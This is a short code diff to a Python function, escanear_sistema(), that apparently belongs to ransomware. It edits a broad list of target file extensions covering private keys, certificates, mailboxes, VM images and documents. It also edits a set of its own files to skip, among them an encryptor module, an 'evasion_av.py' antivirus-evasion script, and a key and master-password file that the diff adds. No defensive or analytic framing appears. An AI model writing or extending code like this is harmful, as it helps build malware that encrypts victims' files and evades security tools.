@@ -66,15 +66,15 @@ def escanear_sistema():
         '.dylib', '.o', '.a', '.lib', '.ocx', '.cpl', '.drv', '.efi',
         '.ini', '.cfg', '.conf', '.config', '.yaml', '.yml', '.toml',
         '.properties', '.env', '.editorconfig', '.htaccess', '.gitignore',
-        '.dockerignore', '.npmignore', '.eslintrc', '.prettierrc', '.babelrc',
-        '.log', '.bak', '.tmp', '.temp', '.cache', '.old', '.orig',
+        '.dockerignore', '.npmignore', '.eslintrc', '.prettierrc', '.babelrc','.log', '.bak', '.tmp', '.temp', '.cache', '.old', '.orig',
         '.swp', '.swo', '.DS_Store', '.localized', '.thumbs', '.lnk',
         '.vhd', '.vhdx', '.vmdk', '.vdi', '.qcow2', '.img', '.ova', '.ovf',
         '.vmx', '.vmem', '.vmsn', '.vmsd', '.nvram', '.vbox', '.hdd',
         '.cer', '.crt', '.pem', '.key', '.pfx', '.p12', '.p7b', '.der',
         '.jks', '.keystore', '.pgp', '.gpg', '.asc', '.p7c', '.spc', '.p7r',
         '.eml', '.msg', '.pst', '.ost', '.mbox', '.emlx', '.mbx', '.dbx',
-        '.epub', '.mobi', '.azw', '.azw3', '.fb2', '.lit', '.lrf', '.cbr','.cbz', '.cb7', '.cbt', '.cba', '.djvu', '.djv', '.ibook',
+        '.epub', '.mobi', '.azw', '.azw3', '.fb2', '.lit', '.lrf', '.cbr',
+        '.cbz', '.cb7', '.cbt', '.cba', '.djvu', '.djv', '.ibook',
         '.dwg', '.dxf', '.skp', '.blend', '.max', '.3ds', '.obj', '.fbx',
         '.stl', '.step', '.stp', '.iges', '.igs', '.sat', '.sldprt', '.sldasm',
         '.slddrw', '.ipt', '.iam', '.idw', '.prt', '.asm', '.drw', '.catpart',
@@ -96,7 +96,8 @@ def escanear_sistema():
     archivos_app = {
         'index.py', 'rutas.py', 'acciones.py', 'encriptador_12_capas.py',
         'evasion_av.py', 'launcher.py', 'launcher.bat', 'launcher.sh',
-        'imagen_sin.jpg', 'ADMINISTRADOR.jpg', 'comprimir.py', 'limpieza.bat'
+        'imagen_sin.jpg', 'ADMINISTRADOR.jpg',
+        'llave.key', 'MASTER_PASSWORD.txt', 'comprimir.py', 'limpieza.bat'
     }
     
     dir_app = os.path.abspath(os.getcwd())
